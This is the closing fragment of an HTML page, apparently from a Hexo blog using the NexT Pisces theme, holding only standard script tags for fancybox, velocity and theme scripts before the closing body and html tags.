  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
